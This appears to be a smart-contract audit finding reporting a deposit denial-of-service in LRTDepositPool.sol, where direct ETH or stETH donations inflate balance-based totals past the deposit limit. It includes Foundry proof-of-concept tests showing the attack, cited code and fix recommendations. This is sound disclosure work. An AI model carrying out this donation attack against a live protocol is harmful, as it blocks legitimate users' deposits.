### Title
Deposit DoS via Token/ETH Donation Inflating `getTotalAssetDeposits` Beyond Deposit Limit - (File: `contracts/LRTDepositPool.sol`)

---

### Summary

`LRTDepositPool.getTotalAssetDeposits()` computes total protocol holdings using live `balanceOf()` and `address.balance` calls. Because `LRTDepositPool` accepts arbitrary ETH via its `receive()` fallback and LST tokens can be transferred directly to it (or to any `NodeDelegator` or `LRTUnstakingVault`), an unprivileged attacker can inflate the reported total deposits beyond `depositLimitByAsset`, permanently blocking all new deposits until an admin raises the limit.

---

### Finding Description

`getTotalAssetDeposits()` aggregates asset holdings across the protocol using raw balance reads:

For LST tokens: [1](#0-0) 

For ETH: [2](#0-1) 

These values feed directly into `_checkIfDepositAmountExceedesCurrentLimit()`: [3](#0-2) 

Which is called inside `_beforeDeposit()` for every deposit: [4](#0-3) 

Because `LRTDepositPool` has an open `receive()` fallback: [5](#0-4) 

Any address can send ETH directly to the pool, inflating `address(this).balance` and therefore `getTotalAssetDeposits(ETH_TOKEN)`. Similarly, any address can call `IERC20(stETH).transfer(address(depositPool), amount)` to inflate the LST balance. Once `totalAssetDeposits >= depositLimitByAsset`, every call to `depositETH` or `depositAsset` reverts with `MaximumDepositLimitReached`.

The same inflation is possible by donating tokens to any `NodeDelegator` address in `nodeDelegatorQueue` (whose balances are summed at line 448) or to `LRTUnstakingVault` (line 461).

---

### Impact Explanation

**Medium — Temporary freezing of funds.**

All new deposits for the targeted asset are blocked. Existing user funds and withdrawals are unaffected, but the protocol cannot accept new capital until an admin raises `depositLimitByAsset`. The attacker can repeat the donation each time the admin raises the limit, sustaining the DoS indefinitely at the cost of the donated tokens (which are irrecoverably added to protocol TVL).

---

### Likelihood Explanation

**Medium.**

The attack requires no privileged access. The attacker only needs to hold LST tokens or ETH (publicly available on-market). The cost is the donated amount, which is lost to the protocol, making it a griefing attack. The deposit limit for stETH and ETHx is set at `100,000 ether` initially; an attacker near that threshold needs only a small donation to tip the check. As TVL grows toward the limit organically, the cost of the attack approaches zero. [6](#0-5) 

---

### Recommendation

Replace live `balanceOf()` / `address.balance` reads in `getTotalAssetDeposits` with an internal accounting variable that is only updated through controlled deposit/withdrawal entry points (similar to how `assetsCommitted` is tracked in `LRTWithdrawalManager`). Alternatively, exclude untracked "donated" balances by computing `assetLyingInDepositPool` as `min(balanceOf(this), internallyTrackedDeposits)`, or add a dedicated `receiveFromDepositor` path that is the only way to credit the pool balance toward the deposit limit. [7](#0-6) 

---

### Proof of Concept

```solidity
// Attacker DoS on ETH deposits
function testDepositDOSViaETHDonation() public {
    // Assume depositLimitByAsset[ETH_TOKEN] = 100_000 ether
    // and current getTotalAssetDeposits(ETH_TOKEN) = 99_999 ether

    // Attacker sends 2 ETH directly to LRTDepositPool
    vm.deal(attacker, 2 ether);
    vm.prank(attacker);
    (bool ok,) = address(lrtDepositPool).call{value: 2 ether}("");
    require(ok);

    // address(lrtDepositPool).balance increased by 2 ether
    // getTotalAssetDeposits(ETH_TOKEN) now = 100_001 ether > 100_000 ether limit

    // Any user deposit now reverts
    vm.deal(user, 1 ether);
    vm.prank(user);
    vm.expectRevert(ILRTDepositPool.MaximumDepositLimitReached.selector);
    lrtDepositPool.depositETH{value: 1 ether}(0, "");
}

// Attacker DoS on LST deposits (e.g. stETH)
function testDepositDOSViaLSTDonation() public {
    // Assume depositLimitByAsset[stETH] = 100_000 ether
    // and current getTotalAssetDeposits(stETH) = 99_999 ether

    // Attacker transfers 2 stETH directly to LRTDepositPool
    vm.prank(attacker);
    stETH.transfer(address(lrtDepositPool), 2 ether);

    // IERC20(stETH).balanceOf(address(lrtDepositPool)) increased by 2 ether
    // getTotalAssetDeposits(stETH) now = 100_001 ether > 100_000 ether limit

    // Any user deposit now reverts
    vm.prank(user);
    vm.expectRevert(ILRTDepositPool.MaximumDepositLimitReached.selector);
    lrtDepositPool.depositAsset(address(stETH), 1 ether, 0, "");
}
``` [8](#0-7) [9](#0-8) [3](#0-2)

### Citations

**File:** contracts/LRTDepositPool.sol (L58-58)
```text
    receive() external payable { }
```

**File:** contracts/LRTDepositPool.sol (L385-397)
```text
    function getTotalAssetDeposits(address asset) public view override returns (uint256 totalAssetDeposit) {
        (
            uint256 assetLyingInDepositPool,
            uint256 assetLyingInNDCs,
            uint256 assetStakedInEigenLayer,
            uint256 assetUnstakingFromEigenLayer,
            uint256 assetLyingInConverter,
            uint256 assetLyingUnstakingVault
        ) = getAssetDistributionData(asset);
        uint256 effectiveAssetWithEigenLayer = assetStakedInEigenLayer + assetUnstakingFromEigenLayer;
        return (assetLyingInDepositPool + assetLyingInNDCs + effectiveAssetWithEigenLayer + assetLyingInConverter
                + assetLyingUnstakingVault);
    }
```

**File:** contracts/LRTDepositPool.sol (L440-462)
```text
        if (asset == LRTConstants.ETH_TOKEN) {
            return getETHDistributionData();
        }

        assetLyingInDepositPool = IERC20(asset).balanceOf(address(this));

        uint256 ndcsCount = nodeDelegatorQueue.length;
        for (uint256 i; i < ndcsCount;) {
            assetLyingInNDCs += IERC20(asset).balanceOf(nodeDelegatorQueue[i]);

            assetStakedInEigenLayer += INodeDelegator(nodeDelegatorQueue[i]).getAssetBalance(asset);
            assetUnstakingFromEigenLayer += INodeDelegator(nodeDelegatorQueue[i]).getAssetUnstaking(asset);

            unchecked {
                ++i;
            }
        }

        address lrtUnstakingVault = lrtConfig.getContract(LRTConstants.LRT_UNSTAKING_VAULT);

        assetLyingInConverter = 0; // assets in converter are accounted in their eth value => getETHDistributionData()
        assetLyingUnstakingVault = IERC20(asset).balanceOf(lrtUnstakingVault);
    }
```

**File:** contracts/LRTDepositPool.sol (L480-496)
```text
        ethLyingInDepositPool = address(this).balance;

        uint256 ndcsCount = nodeDelegatorQueue.length;

        for (uint256 i; i < ndcsCount;) {
            ethLyingInNDCs += nodeDelegatorQueue[i].balance;

            ethStakedInEigenLayer += INodeDelegator(nodeDelegatorQueue[i]).getEffectivePodShares();
            ethUnstakingFromEigenLayer += INodeDelegator(nodeDelegatorQueue[i])
                .getAssetUnstaking(LRTConstants.ETH_TOKEN);
            unchecked {
                ++i;
            }
        }

        address lrtUnstakingVault = lrtConfig.getContract(LRTConstants.LRT_UNSTAKING_VAULT);
        ethLyingInUnstakingVault = lrtUnstakingVault.balance;
```

**File:** contracts/LRTDepositPool.sol (L661-663)
```text
        if (_checkIfDepositAmountExceedesCurrentLimit(asset, depositAmount)) {
            revert MaximumDepositLimitReached();
        }
```

**File:** contracts/LRTDepositPool.sol (L676-682)
```text
    function _checkIfDepositAmountExceedesCurrentLimit(address asset, uint256 amount) internal view returns (bool) {
        uint256 totalAssetDeposits = getTotalAssetDeposits(asset);
        if (asset == LRTConstants.ETH_TOKEN) {
            return (totalAssetDeposits > lrtConfig.depositLimitByAsset(asset));
        }
        return (totalAssetDeposits + amount > lrtConfig.depositLimitByAsset(asset));
    }
```

**File:** contracts/LRTConfig.sol (L56-57)
```text
        _addNewSupportedAsset(stETH, 100_000 ether);
        _addNewSupportedAsset(ethX, 100_000 ether);
```

**File:** contracts/LRTWithdrawalManager.sol (L53-53)
```text
    mapping(address asset => uint256 amount) public assetsCommitted;
```
